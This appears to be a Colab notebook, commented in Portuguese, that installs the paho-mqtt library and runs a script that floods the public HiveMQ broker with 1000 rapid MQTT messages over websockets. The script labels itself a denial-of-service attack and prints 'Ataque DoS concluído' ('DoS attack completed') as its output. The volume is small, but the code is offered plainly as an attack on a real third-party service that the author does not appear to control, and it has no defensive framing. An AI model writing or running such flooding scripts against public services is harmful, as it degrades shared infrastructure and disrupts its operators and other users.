{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!pip install paho-mqtt==1.5.1\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "WW5IxJOyCWD0",
        "outputId": "5ef89c7c-05c9-481a-c833-5d51b32421ec"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting paho-mqtt==1.5.1\n",
            "  Downloading paho-mqtt-1.5.1.tar.gz (101 kB)\n",
            "\u001b[?25l     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/101.8 kB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[90m╺\u001b[0m\u001b[90m━━━\u001b[0m \u001b[32m92.2/101.8 kB\u001b[0m \u001b[31m2.6 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m101.8/101.8 kB\u001b[0m \u001b[31m2.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: paho-mqtt\n",
            "  Building wheel for paho-mqtt (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for paho-mqtt: filename=paho_mqtt-1.5.1-py3-none-any.whl size=61549 sha256=c65e1e8659ff757f586de93f987a01ecc5529a260b05372ba0179bff416e8d44\n",
            "  Stored in directory: /root/.cache/pip/wheels/b6/72/f9/44ca415a44f9cc7468fe4c59e6282938e504fadec09641fa63\n",
            "Successfully built paho-mqtt\n",
            "Installing collected packages: paho-mqtt\n",
            "Successfully installed paho-mqtt-1.5.1\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import paho.mqtt.client as mqtt\n",
        "import time\n",
        "\n",
        "# Função de callback quando a conexão com o broker for bem-sucedida\n",
        "def on_connect(client, userdata, flags, rc):\n",
        "    if rc == 0:\n",
        "        print(\"Conectado com sucesso ao broker MQTT\")\n",
        "    else:\n",
        "        print(f\"Falha na conexão, código de erro: {rc}\")\n",
        "\n",
        "# Configurações do broker\n",
        "broker = \"broker.hivemq.com\"\n",
        "port = 8000\n",
        "client_id = \"clientID12345\"\n",
        "\n",
        "# Criar o objeto client\n",
        "client = mqtt.Client(client_id, transport=\"websockets\")\n",
        "client.on_connect = on_connect\n",
        "\n",
        "# Definir opções do WebSocket\n",
        "client.ws_set_options(path=\"/mqtt\")\n",
        "\n",
        "# Conectar ao broker\n",
        "client.connect(broker, port, 60)\n",
        "client.loop_start()\n",
        "\n",
        "# Publicar uma grande quantidade de mensagens rapidamente\n",
        "topic = \"test/topic12345\"\n",
        "message_count = 1000\n",
        "\n",
        "for i in range(message_count):\n",
        "    result = client.publish(topic, f\"Mensagem {i}\")\n",
        "    if result.rc != 0:\n",
        "        print(f\"Erro ao publicar mensagem {i}, código: {result.rc}\")\n",
        "\n",
        "client.loop_stop()\n",
        "print(\"Ataque DoS concluído.\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "JLFeullhCbNG",
        "outputId": "0137df16-b022-49d2-81bf-95f50b37f48e"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Ataque DoS concluído.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "qcy-C4wFFIpq"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}